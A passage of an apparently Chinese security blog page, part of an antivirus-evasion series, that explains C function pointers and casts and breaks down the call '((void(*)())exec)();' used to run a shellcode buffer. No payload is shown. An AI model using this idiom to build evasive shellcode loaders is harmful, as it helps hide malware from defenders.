class="line">    &#123;</span><br><span class="line">        z = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        z = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">please enter a and b:3 4</span><br><span class="line">a &#x3D; 3</span><br><span class="line">b &#x3D; 4</span><br><span class="line">max &#x3D; 4</span><br></pre></td></tr></table></figure>
+
+<p>在上述代码中定义了int型的指针p，p指向一个函数，该函数接受两个int型的参数</p>
+<p>如果p是指向返回类型为void的函数的指针，那么p的声明应该类似</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void (*p)();</span><br></pre></td></tr></table></figure>
+
+<p>在c语言的类型转换中，如果想把float类型转为int型的话，强制类型转换方法如下：</p>
+<p>float a=1.1;</p>
+<p>float b=(int)a;</p>
+<p>虽然上述例子与int b=a;的结果一致，但上述例子突出了使用强制类型转换：把变量a从float类型专为了int类型，那么我们可以得到类型转换的方法为在变量前面加**(type)<strong>，这里的</strong>type<strong>就是</strong>int**,即**(int)<strong>,我们从变量声明的int a;到类型转换的(int) a 的区别为：去掉</strong>变量名**与分号，并将剩余部分括起来，就得到了int型的强制类型转换方法。</p>
+<p>如果我们想得到一个void类型的函数的指针应该怎么做？</p>
+<p>上面提到的 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void (*p)();</span><br></pre></td></tr></table></figure>
+
+<p>是一个void类型的函数指针p的<strong>变量声明</strong>，根据上述规则，强制转换方法为**(void (<em>)())**,即我们可以在某变量前面添加*</em>(void (*)())**将其强制转换为返回值为空的指向函数的指针类型。</p>
+<p>现在再把下面的代码拆开理解：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(    (void(*)())    exec    )()；</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>(void(<em>)())<strong>代表将exec转为返回值为空的指针类型，</strong>(    (void(</em>)())    exec    )()<strong>和</strong>(   * (void(*)())    exec    )()<strong>等价，都是代表调用返回值类型为</strong>void</strong>的<strong>函数指针exec</strong>所指向的函数.</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://fengwenhua.top/index.php/archives/64/">https://fengwenhua.top/index.php/archives/64/</a></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>Article Link</strong>
+      <p style="width: 100%;
+  word-wrap: break-word;
+  word-break: break-all;
+  overflow: hidden;">https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%AE%A4%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/</p>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>Copyright Notice: </strong> All articles in this blog, unless otherwise stated, are under the<a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external"> CC BY 4.0 CN agreement</a>.Reprint please indicate the source!
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/polosec" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="http://cdn.polowong.top/1.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/polosec" target="_blank"><span class="text-dark">Polo</span><small class="ml-1x">CTFer&amp;Cybersec Researcher</small></a></h3>
+        <div>Wong</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="uyan_frame"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/" title="免杀基础之远程线程注入"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>Maybe you could buy me a cup of coffee.</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/polosec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/polosec" target="_blank"> polosec </a>base on <a href="https://github.com/polosec/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+    <script defer type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=[object Object]"></script>
+
+
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+
+
+</body>
+</html>
